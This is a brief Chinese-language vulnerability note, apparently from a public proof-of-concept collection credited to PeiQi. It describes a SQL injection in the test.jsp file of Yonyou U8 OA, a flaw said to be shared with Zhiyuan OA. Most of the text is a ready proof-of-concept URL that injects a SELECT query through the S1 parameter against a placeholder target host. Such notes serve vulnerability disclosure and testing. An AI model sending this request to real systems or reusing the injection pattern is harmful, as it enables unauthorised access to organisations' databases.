# 用友 U8 OA test.jsp SQL注入漏洞

用友 U8 OA test.jsp文件存在 SQL注入漏洞，由于与致远OA使用相同的文件，于是存在了同样的漏洞。

poc:

```
http://target/yyoa/common/js/menu/test.jsp?doType=101&S1=(SELECT%20MD5(1))

```

via:PeiQi
